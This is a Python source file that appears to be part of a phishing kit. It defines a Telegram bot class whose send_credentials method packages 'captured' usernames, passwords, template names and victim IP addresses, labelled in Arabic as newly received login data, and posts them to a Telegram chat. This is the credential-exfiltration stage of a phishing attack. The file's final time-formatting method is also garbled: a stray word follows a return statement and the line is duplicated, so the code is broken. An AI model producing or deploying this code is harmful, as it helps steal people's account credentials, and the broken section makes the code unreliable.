
import requests
import json

class TelegramBot:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
    
    def send_message(self, message):
        """Send message to Telegram chat"""
        try:
            url = f"{self.api_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data)
            return response.status_code == 200
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
            return False
    
    def send_credentials(self, template_name, username, password, ip_address=None):
        """Send captured credentials to Telegram"""
        message = f"🚨 <b>تم تلقي بيانات دخول جديدة!</b> 🚨\n\n"
        message += f"📱 <b>القالب:</b> {template_name}\n"
        message += f"👤 <b>اسم المستخدم:</b> {username}\n"
        message += f"🔒 <b>كلمة المرور:</b> {password}\n"
        if ip_address:
            message += f"🌐 <b>عنوان IP:</b> {ip_address}\n"
        message += f"⏰ <b>الوقت:</b> {self.get_current_time()}"
        
        return self.send_message(message)
    
    def get_current_time(self):
        """Get current time formatted"""
        import datetime
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") datetime
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
